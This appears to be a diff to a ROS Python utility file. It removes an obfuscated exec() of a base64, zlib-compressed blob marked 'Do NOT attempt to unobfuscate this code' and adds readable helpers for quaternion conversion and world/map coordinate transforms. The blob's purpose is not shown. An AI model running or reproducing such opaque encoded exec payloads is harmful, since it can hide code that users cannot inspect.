@@ -1,5 +1,72 @@
 #!/usr/bin/env python
-# Do NOT attempt to unobfuscate this code
-import zlib, base64
-exec(zlib.decompress(base64.b64decode('eJztVsty0zAU3ecrzLBxUsV5sOuMF6U8yrulQMt4PBnVkW1RW1IkOYny9UiKnRRaykiLAjMsbOt17z3nSjrXjx+NGsFHV5iMEFkGTMmSkt6Xd+wCVs/PT99vnpJ6uX7xjL78+kleHWXzt2cnmDcfX72+Xn1AbxbH+bfP4rIo47yiUDoaXhZKxJjIHq4Z5TLgVDDVdUhTMxVAERDWyzmtAyHns1oUItKvoF10guAc8e38EosGVngDJabk1sp3kF93KwtEayS5urXolGo04JQKZF/nEtYMzW37iHOowFkDJeJEB9CDlSoo2a+xXWBdPJlamwssy2O6hBxDkt3wple0nY6szCPJIRE55bXFL/YzXUtPsIrKCl9FTJmWSQ6rZG+O8gCSokIzSWeLHcLQaTNKvRuif9gLOJINJ8GeaTi4jS7ah5mZlM5QUyEejsEYeETtWwo3XGoellC4MIjWQIENWMWLaA0WkdLPRj8rDZVWFWBYZiVQcBXfAdPC2iK8kZiw9agDd3S1vQXBqWzPD5Qcr0NZIgkNiAyImLAoo6IdA7onMGl7O0d6tDVNkgwMRQoSAbI03XJcUV7NDb0aspCZc6YbM0xyamK4pk6ouDOPOBK0agx0dz+FiId3ZX/nnHJcYGI+iGzz0/eIouJkHOkjsn1SHw/JOI3DSTQeuSuU83UQqt8f2E3SUYc/50KPY5OIaO2VimTyR4hM7iGi/IhM09i6nqY/XBIPGehulIepO3LVImXKPZ45hn7J0sfXvUSG2cAr1FD42E08qU28qLlDVOLAKx++vKbpgRsxeyJ39cA9oi0U5pZqHbb14q8qFA9SJ/TNhOZ/K0xa+d2xj0qEi1IOWzUDrfSYvf0vPr8XnwdWEl8heUhV8MJ4OE0HjnLnW7o9t/og/vUfi+e23ONS/SPS+h32TFly')))
-# Do NOT attempt to unobfuscate this code
+
+import rospy
+import numpy as np
+
+from std_msgs.msg import Header
+from visualization_msgs.msg import Marker
+from geometry_msgs.msg import Point, Pose, PoseStamped, PoseArray, Quaternion, PolygonStamped,Polygon, Point32, PoseWithCovarianceStamped, PointStamped
+import tf.transformations
+import tf
+import matplotlib.pyplot as plt
+
+def angle_to_quaternion(angle):
+    """Convert an angle in radians into a quaternion _message_."""
+    return Quaternion(*tf.transformations.quaternion_from_euler(0, 0, angle))
+
+def quaternion_to_angle(q):
+    """Convert a quaternion _message_ into an angle in radians.
+    The angle represents the yaw.
+    This is not just the z component of the quaternion."""
+    x, y, z, w = q.x, q.y, q.z, q.w
+    roll, pitch, yaw = tf.transformations.euler_from_quaternion((x, y, z, w))
+    return yaw
+
+def rotation_matrix(theta):
+    c, s = np.cos(theta), np.sin(theta)
+    return np.matrix([[c, -s], [s, c]])
+
+
+def world_to_map(pose, map_info):
+    # equivalent to map_to_grid(world_to_map(pose))
+    # operates in place
+    scale = map_info.resolution
+    angle = -quaternion_to_angle(map_info.origin.orientation)
+    config = [0.0,0.0]
+    # translation
+    config[0] = (1.0/float(scale))*(pose[0] - map_info.origin.position.x)
+    config[1] = (1.0/float(scale))*(pose[1] - map_info.origin.position.y)
+   
+
+    # rotation
+    c, s = np.cos(angle), np.sin(angle)
+    # we need to store the x coordinates since they will be overwritten
+    temp = np.copy(config[0])
+    config[0] = int(c*config[0] - s*config[1])
+    config[1] = int(s*temp       + c*config[1])
+    
+    return config
+      
+      
+def map_to_world(pose,map_info):
+    scale = map_info.resolution
+    angle = quaternion_to_angle(map_info.origin.orientation)
+
+    # rotate
+    config = np.array([pose[0],map_info.height-pose[1],pose[2]])
+    # rotation
+    c, s = np.cos(angle), np.sin(angle)
+    # we need to store the x coordinates since they will be overwritten
+    temp = np.copy(config[0])
+    config[0] = c*config[0] - s*config[1]
+    config[1] = s*temp       + c*config[1]
+
+    # scale
+    config[:2] *= float(scale)
+
+    # translate
+    config[0] += map_info.origin.position.x
+    config[1] += map_info.origin.position.y
+    config[2] += angle
+
+    return config
